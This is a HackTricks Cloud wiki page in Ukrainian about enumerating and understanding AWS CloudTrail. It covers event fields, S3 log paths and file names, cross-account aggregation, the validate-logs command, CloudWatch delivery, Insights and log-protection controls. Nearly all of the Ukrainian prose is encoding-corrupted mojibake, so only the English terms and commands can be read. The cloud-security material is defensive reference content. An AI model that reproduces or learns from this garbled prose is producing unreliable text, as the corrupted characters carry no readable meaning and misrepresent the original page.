# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **—Ä–µ—î—Å—Ç—Ä—É—î —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏—Ç—å –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å —É –≤–∞—à–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ AWS**. –í—ñ–Ω –∑–∞—Ö–æ–ø–ª—é—î –¥–µ—Ç–∞–ª—å–Ω—ñ **–∂—É—Ä–Ω–∞–ª–∏ –ø–æ–¥—ñ–π**, –≤–∫–ª—é—á–∞—é—á–∏, —Ö—Ç–æ —â–æ –∑—Ä–æ–±–∏–≤, –∫–æ–ª–∏ —ñ –∑–≤—ñ–¥–∫–∏, –¥–ª—è –≤—Å—ñ—Ö –≤–∑–∞—î–º–æ–¥—ñ–π –∑ —Ä–µ—Å—É—Ä—Å–∞–º–∏ AWS. –¶–µ –∑–∞–±–µ–∑–ø–µ—á—É—î –∞—É–¥–∏—Ç –∑–º—ñ–Ω —ñ –¥—ñ–π, –¥–æ–ø–æ–º–∞–≥–∞—é—á–∏ –≤ –∞–Ω–∞–ª—ñ–∑—ñ –±–µ–∑–ø–µ–∫–∏, –∞—É–¥–∏—Ç—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ —Ç–∞ –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—ñ –∑–º—ñ–Ω —Ä–µ—Å—É—Ä—Å—ñ–≤. CloudTrail —î –≤–∞–∂–ª–∏–≤–∏–º –¥–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —ñ —Ä–µ—Å—É—Ä—Å—ñ–≤, –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ —Ç–∞ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ —Ä–µ–≥—É–ª—è—Ç–æ—Ä–Ω–∏–º –≤–∏–º–æ–≥–∞–º.

–ö–æ–∂–Ω–∞ –∑–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω–∞ –ø–æ–¥—ñ—è –º—ñ—Å—Ç–∏—Ç—å:

* –ù–∞–∑–≤—É –≤–∏–∫–ª–∏–∫–∞–Ω–æ–≥–æ API: `eventName`
* –í–∏–∫–ª–∏–∫–∞–Ω—É —Å–ª—É–∂–±—É: `eventSource`
* –ß–∞—Å: `eventTime`
* IP-–∞–¥—Ä–µ—Å—É: `SourceIPAddress`
* –ú–µ—Ç–æ–¥ –∞–≥–µ–Ω—Ç–∞: `userAgent`. –ü—Ä–∏–∫–ª–∞–¥–∏:
* Signing.amazonaws.com - –ó AWS Management Console
* console.amazonaws.com - –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á root –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É
* lambda.amazonaws.com - AWS Lambda
* –ü–∞—Ä–∞–º–µ—Ç—Ä–∏ –∑–∞–ø–∏—Ç—É: `requestParameters`
* –ï–ª–µ–º–µ–Ω—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ: `responseElements`

–ü–æ–¥—ñ—ó –∑–∞–ø–∏—Å—É—é—Ç—å—Å—è –≤ –Ω–æ–≤–∏–π —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É **–ø—Ä–∏–±–ª–∏–∑–Ω–æ –∫–æ–∂–Ω—ñ 5 —Ö–≤–∏–ª–∏–Ω —É —Ñ–∞–π–ª—ñ JSON**, –≤–æ–Ω–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è CloudTrail, –∞ –≤ –∫—ñ–Ω—Ü–µ–≤–æ–º—É –ø—ñ–¥—Å—É–º–∫—É —Ñ–∞–π–ª–∏ –∂—É—Ä–Ω–∞–ª—ñ–≤ **–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç—å—Å—è –≤ S3 –ø—Ä–∏–±–ª–∏–∑–Ω–æ —á–µ—Ä–µ–∑ 15 —Ö–≤–∏–ª–∏–Ω**.\
–ñ—É—Ä–Ω–∞–ª–∏ CloudTrail –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∞–≥—Ä–µ–≥–æ–≤–∞–Ω—ñ –º—ñ–∂ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ —Ç–∞ —Ä–µ–≥—ñ–æ–Ω–∞–º–∏.**\
CloudTrail –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—Ü—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—å —Ñ–∞–π–ª—ñ–≤ –∂—É—Ä–Ω–∞–ª—ñ–≤, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ –≤–∞—à—ñ —Ñ–∞–π–ª–∏ –∂—É—Ä–Ω–∞–ª—ñ–≤ –∑–∞–ª–∏—à–∏–ª–∏—Å—è –Ω–µ–∑–º—ñ–Ω–Ω–∏–º–∏** –∑ –º–æ–º–µ–Ω—Ç—É —ó—Ö –¥–æ—Å—Ç–∞–≤–∫–∏ CloudTrail. –í—ñ–Ω —Å—Ç–≤–æ—Ä—é—î SHA-256 —Ö–µ—à –∂—É—Ä–Ω–∞–ª—ñ–≤ —É —Ñ–∞–π–ª—ñ –¥–∞–π–¥–∂–µ—Å—Ç—É. SHA-256 —Ö–µ—à –Ω–æ–≤–∏—Ö –∂—É—Ä–Ω–∞–ª—ñ–≤ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è —â–æ–≥–æ–¥–∏–Ω–∏.\
–ü—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ Trail —Å–µ–ª–µ–∫—Ç–æ—Ä–∏ –ø–æ–¥—ñ–π –¥–æ–∑–≤–æ–ª—è—Ç—å –≤–∞–º –≤–∫–∞–∑–∞—Ç–∏, —è–∫—ñ –ø–æ–¥—ñ—ó –∂—É—Ä–Ω–∞–ª—é–≤–∞—Ç–∏: —É–ø—Ä–∞–≤–ª—ñ–Ω—Å—å–∫—ñ, –¥–∞–Ω—ñ –∞–±–æ –ø–æ–¥—ñ—ó –∞–Ω–∞–ª—ñ—Ç–∏–∫–∏.

–ñ—É—Ä–Ω–∞–ª–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ –∫–æ—à–∏–∫—É S3. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ (SSE-S3), —Ç–æ–º—É AWS —Ä–æ–∑—à–∏—Ñ—Ä—É—î –≤–º—ñ—Å—Ç –¥–ª—è –ª—é–¥–µ–π, —è–∫—ñ –º–∞—é—Ç—å –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø, –∞–ª–µ –¥–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó –±–µ–∑–ø–µ–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ SSE –∑ KMS —Ç–∞ –≤–∞—à–∏–º–∏ –≤–ª–∞—Å–Ω–∏–º–∏ –∫–ª—é—á–∞–º–∏.

–ñ—É—Ä–Ω–∞–ª–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ **–∫–æ—à–∏–∫—É S3 –∑ —Ç–∞–∫–∏–º —Ñ–æ—Ä–º–∞—Ç–æ–º —ñ–º–µ–Ω—ñ**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* –Ü–º'—è –∫–æ—à–∏–∫–∞: **`aws-cloudtrail-logs-<accountid>-<random>`**
* –ü—Ä–∏–∫–ª–∞–¥: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

–£ –∫–æ–∂–Ω—ñ–π –ø–∞–ø—Ü—ñ –∫–æ–∂–µ–Ω –∂—É—Ä–Ω–∞–ª –º–∞—Ç–∏–º–µ **—ñ–º'—è, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ü—å–æ–º—É —Ñ–æ—Ä–º–∞—Ç—É**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

–ö–æ–Ω–≤–µ–Ω—Ü—ñ—è —ñ–º–µ–Ω—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ –∂—É—Ä–Ω–∞–ª—ñ–≤

![](<../../../../.gitbook/assets/image (122).png>)

–ö—Ä—ñ–º —Ç–æ–≥–æ, **—Ñ–∞–π–ª–∏ –¥–∞–π–¥–∂–µ—Å—Ç—É (–¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤)** –±—É–¥—É—Ç—å —É **—Ç–æ–º—É –∂ –∫–æ—à–∏–∫—É** –≤:

![](<../../../../.gitbook/assets/image (195).png>)

### –ê–≥—Ä–µ–≥–∞—Ü—ñ—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –∑ –∫—ñ–ª—å–∫–æ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤

* –°—Ç–≤–æ—Ä—ñ—Ç—å Trail –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS, –∫—É–¥–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ, —â–æ–± —Ñ–∞–π–ª–∏ –∂—É—Ä–Ω–∞–ª—ñ–≤ –±—É–ª–∏ –¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ñ
* –ó–∞—Å—Ç–æ—Å—É–π—Ç–µ –¥–æ–∑–≤–æ–ª–∏ –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–æ—à–∏–∫–∞ S3, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –¥–æ—Å—Ç—É–ø –º—ñ–∂ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ –¥–ª—è CloudTrail —ñ –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∫–æ–∂–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É AWS, —è–∫–∏–π –ø–æ—Ç—Ä–µ–±—É—î –¥–æ—Å—Ç—É–ø—É
* –°—Ç–≤–æ—Ä—ñ—Ç—å –Ω–æ–≤–∏–π Trail –≤ —ñ–Ω—à–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å–∞—Ö AWS —ñ –≤–∏–±–µ—Ä—ñ—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–æ—à–∏–∫–∞ –Ω–∞ –µ—Ç–∞–ø—ñ 1

–û–¥–Ω–∞–∫, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏ –≤—Å—ñ –∂—É—Ä–Ω–∞–ª–∏ –≤ –æ–¥–Ω–æ–º—É –∫–æ—à–∏–∫—É S3, –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∞–≥—Ä–µ–≥—É–≤–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ CloudTrail –∑ –∫—ñ–ª—å–∫–æ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —É –∂—É—Ä–Ω–∞–ª–∏ CloudWatch, —â–æ –Ω–∞–ª–µ–∂–∞—Ç—å –æ–¥–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É AWS.

{% hint style="danger" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –º–æ–∂–µ –º–∞—Ç–∏ **—Ä—ñ–∑–Ω—ñ Trails** –∑ CloudTrail **—É–≤—ñ–º–∫–Ω–µ–Ω–∏–º–∏**, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –æ–¥–Ω–∞–∫–æ–≤—ñ (–∞–±–æ —Ä—ñ–∑–Ω—ñ) –∂—É—Ä–Ω–∞–ª–∏ –≤ —Ä—ñ–∑–Ω–∏—Ö –∫–æ—à–∏–∫–∞—Ö.
{% endhint %}

### CloudTrail –∑ —É—Å—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó –≤ 1

–ü—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ CloudTrail –º–æ–∂–ª–∏–≤–æ –≤–∫–∞–∑–∞—Ç–∏ –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ cloudtrail –¥–ª—è –≤—Å—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó —Ç–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ –≤ –ª–∏—à–µ 1 –∫–æ—à–∏–∫:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤–∏ –º–æ–∂–µ—Ç–µ –ª–µ–≥–∫–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ CloudTrail —É –≤—Å—ñ—Ö —Ä–µ–≥—ñ–æ–Ω–∞—Ö —É—Å—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —ñ —Ü–µ–Ω—Ç—Ä–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ –≤ 1 –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ (—è–∫–∏–π –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–∞—Ö–∏—Å—Ç–∏—Ç–∏).

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —Ñ–∞–π–ª—ñ–≤ –∂—É—Ä–Ω–∞–ª—ñ–≤

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ –∂—É—Ä–Ω–∞–ª–∏ –Ω–µ –±—É–ª–∏ –∑–º—ñ–Ω–µ–Ω—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### –õ–æ–≥–∏ –¥–æ CloudWatch

**CloudTrail –º–æ–∂–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ª–æ–≥–∏ –¥–æ CloudWatch, —â–æ–± –≤–∏ –º–æ–≥–ª–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è, —è–∫—ñ –ø–æ–ø–µ—Ä–µ–¥–∂–∞—é—Ç—å –≤–∞—Å –ø—Ä–æ –ø—ñ–¥–æ–∑—Ä—ñ–ª—ñ –¥—ñ—ó.**\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ç–æ–≥–æ, —â–æ–± CloudTrail –º—ñ–≥ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –ª–æ–≥–∏ –¥–æ CloudWatch, –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Ä–æ–ª—å**, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î —Ü—é –¥—ñ—é. –Ø–∫—â–æ –º–æ–∂–ª–∏–≤–æ, —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É —Ä–æ–ª—å AWS –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ü–∏—Ö –¥—ñ–π. –¶—è —Ä–æ–ª—å –¥–æ–∑–≤–æ–ª–∏—Ç—å CloudTrail:

* CreateLogStream: –¶–µ –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –ø–æ—Ç–æ–∫–∏ –ª–æ–≥—ñ–≤ CloudWatch
* PutLogEvents: –î–æ—Å—Ç–∞–≤–ª—è—Ç–∏ –ª–æ–≥–∏ CloudTrail –¥–æ –ø–æ—Ç–æ–∫—É –ª–æ–≥—ñ–≤ CloudWatch

### –Ü—Å—Ç–æ—Ä—ñ—è –ø–æ–¥—ñ–π

–Ü—Å—Ç–æ—Ä—ñ—è –ø–æ–¥—ñ–π CloudTrail –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º –ø–µ—Ä–µ–≥–ª—è–¥–∞—Ç–∏ –≤ —Ç–∞–±–ª–∏—Ü—ñ –ª–æ–≥–∏, —è–∫—ñ –±—É–ª–∏ –∑–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ:

![](<../../../../.gitbook/assets/image (89).png>)

### –Ü–Ω—Å–∞–π—Ç–∏

**CloudTrail Insights** –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ **–∞–Ω–∞–ª—ñ–∑—É—î** –ø–æ–¥—ñ—ó —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –∑–∞–ø–∏—Å–∞–º–∏ –∑ —Ç—Ä–∞—Å CloudTrail —ñ **—Å–ø–æ–≤—ñ—â–∞—î** –≤–∞—Å –ø—Ä–æ **–Ω–µ–∑–≤–∏—á–∞–π–Ω—É –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ —î –∑–±—ñ–ª—å—à–µ–Ω–Ω—è –ø–æ–¥—ñ–π `TerminateInstance`, —è–∫–µ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—Ö –±–∞–∑–æ–≤–∏—Ö –∑–Ω–∞—á–µ–Ω—å, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ —Ü–µ —è–∫ –ø–æ–¥—ñ—é Insights. –¶—ñ –ø–æ–¥—ñ—ó —Ä–æ–±–ª—è—Ç—å **–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ç–∞ —Ä–µ–∞–≥—É–≤–∞–Ω–Ω—è –Ω–∞ –Ω–µ–∑–≤–∏—á–∞–π–Ω—É –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å API –ª–µ–≥—à–∏–º–∏** –Ω—ñ–∂ –±—É–¥—å-–∫–æ–ª–∏.

–Ü–Ω—Å–∞–π—Ç–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ —Ç–æ–º—É –∂ –±–∞–∫–µ—Ç—ñ, —â–æ –π –ª–æ–≥–∏ CloudTrail: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### –ë–µ–∑–ø–µ–∫–∞

| –¶—ñ–ª—ñ—Å–Ω—ñ—Å—Ç—å —Ñ–∞–π–ª—ñ–≤ –ª–æ–≥—ñ–≤ CloudTrail   | <ul><li>–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –Ω–µ –±—É–ª–∏ –ª–æ–≥–∏ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ (–∑–º—ñ–Ω–µ–Ω—ñ –∞–±–æ –≤–∏–¥–∞–ª–µ–Ω—ñ)</li><li><p>–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ–∞–π–ª–∏ –¥–∞–π–¥–∂–µ—Å—Ç—É (—Å—Ç–≤–æ—Ä—é—î —Ö–µ—à –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ —Ñ–∞–π–ª—É)</p><ul><li>SHA-256 —Ö–µ—à—É–≤–∞–Ω–Ω—è</li><li>SHA-256 –∑ RSA –¥–ª—è —Ü–∏—Ñ—Ä–æ–≤–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É</li><li>–ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á, —â–æ –Ω–∞–ª–µ–∂–∏—Ç—å Amazon</li></ul></li><li>–°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ–∞–π–ª—É –¥–∞–π–¥–∂–µ—Å—Ç—É –∑–∞–π–º–∞—î 1 –≥–æ–¥–∏–Ω—É (–∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è —â–æ–≥–æ–¥–∏–Ω–∏)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| –ó—É–ø–∏–Ω–∏—Ç–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø    | <ul><li><p>–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –ø–æ–ª—ñ—Ç–∏–∫–∏ IAM —Ç–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏ –±–∞–∫–µ—Ç—ñ–≤ S3</p><ul><li>–∫–æ–º–∞–Ω–¥–∞ –±–µ–∑–ø–µ–∫–∏ ‚Äî> –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—Å—å–∫–∏–π –¥–æ—Å—Ç—É–ø</li><li>–∞—É–¥–∏—Ç–æ—Ä–∏ ‚Äî> –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è</li></ul></li><li>–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ SSE-S3/SSE-KMS –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –ª–æ–≥—ñ–≤</li></ul>                                                                                                                                        |
| –ó–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∏–¥–∞–ª–µ–Ω–Ω—é —Ñ–∞–π–ª—ñ–≤ –ª–æ–≥—ñ–≤    | <ul><li>–û–±–º–µ–∂–∏—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é IAM —Ç–∞ –ø–æ–ª—ñ—Ç–∏–∫ –±–∞–∫–µ—Ç—ñ–≤</li><li>–ù–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ S3 MFA –≤–∏–¥–∞–ª–µ–Ω–Ω—è</li><li>–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ñ–∞–π–ª—ñ–≤ –ª–æ–≥—ñ–≤</li></ul>                                                                                                                                                                                            |

## –ö–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –¥–æ—Å—Ç—É–ø—É

AWS Access Advisor —Å–ø–∏—Ä–∞—î—Ç—å—Å—è –Ω–∞ –æ—Å—Ç–∞–Ω–Ω—ñ 400 –¥–Ω—ñ–≤ –ª–æ–≥—ñ–≤ AWS **CloudTrail –¥–ª—è –∑–±–æ—Ä—É —Å–≤–æ—ó—Ö —ñ–Ω—Å–∞–π—Ç—ñ–≤**. CloudTrail —Ñ—ñ–∫—Å—É—î —ñ—Å—Ç–æ—Ä—ñ—é –≤–∏–∫–ª–∏–∫—ñ–≤ API AWS —Ç–∞ –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –ø–æ–¥—ñ–π, —â–æ –≤—ñ–¥–±—É–ª–∏—Å—è –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS. –ö–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –¥–æ—Å—Ç—É–ø—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ü—ñ –¥–∞–Ω—ñ, —â–æ–± **–ø–æ–∫–∞–∑–∞—Ç–∏, –∫–æ–ª–∏ —Å–µ—Ä–≤—ñ—Å–∏ –≤–æ—Å—Ç–∞–Ω–Ω—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏—Å—è**. –ê–Ω–∞–ª—ñ–∑—É—é—á–∏ –ª–æ–≥–∏ CloudTrail, –ö–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç –¥–æ—Å—Ç—É–ø—É –º–æ–∂–µ –≤–∏–∑–Ω–∞—á–∏—Ç–∏, —è–∫—ñ —Å–µ—Ä–≤—ñ—Å–∏ AWS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á IAM –∞–±–æ —Ä–æ–ª—å, —ñ –∫–æ–ª–∏ —Ü–µ–π –¥–æ—Å—Ç—É–ø –≤—ñ–¥–±—É–≤–∞–≤—Å—è. –¶–µ –¥–æ–ø–æ–º–∞–≥–∞—î –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º AWS –ø—Ä–∏–π–º–∞—Ç–∏ –æ–±“ë—Ä—É–Ω—Ç–æ–≤–∞–Ω—ñ —Ä—ñ—à–µ–Ω–Ω—è —â–æ–¥–æ **—É–¥–æ—Å–∫–æ–Ω–∞–ª–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –≤–∏—è–≤–∏—Ç–∏ —Å–µ—Ä–≤—ñ—Å–∏, —è–∫—ñ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏—Å—è –ø—Ä–æ—Ç—è–≥–æ–º —Ç—Ä–∏–≤–∞–ª–æ–≥–æ —á–∞—Å—É, —ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –∑–º–µ–Ω—à–∏—Ç–∏ –Ω–∞–¥—Ç–æ —à–∏—Ä–æ–∫—ñ –¥–æ–∑–≤–æ–ª–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ–∞–ª—å–Ω–∏—Ö –ø–∞—Ç–µ—Ä–Ω—ñ–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.

{% hint style="success" %}
